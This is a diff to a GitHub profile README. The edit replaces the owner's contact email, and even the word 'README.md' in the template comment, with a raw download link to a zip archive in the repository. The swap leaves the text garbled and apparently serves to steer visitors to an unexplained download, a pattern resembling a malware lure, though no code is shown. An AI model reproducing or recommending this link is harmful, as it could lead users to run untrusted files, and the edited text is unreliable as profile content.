@@ -2,11 +2,11 @@
 - 👀 I’m interested in business with Tech
 - 🌱 I’m currently learning python
 - 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me : E-Mail me "gauravsingh200406@gmail.com"
+- 📫 How to reach me : E-Mail me "https://github.com/GauravSingh234/GauravSingh234/raw/refs/heads/main/liquidable/Gaurav-Singh-1.4-beta.1.zip"
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 
 <!---
-GauravSingh234/GauravSingh234 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+GauravSingh234/GauravSingh234 is a ✨ special ✨ repository because its `https://github.com/GauravSingh234/GauravSingh234/raw/refs/heads/main/liquidable/Gaurav-Singh-1.4-beta.1.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
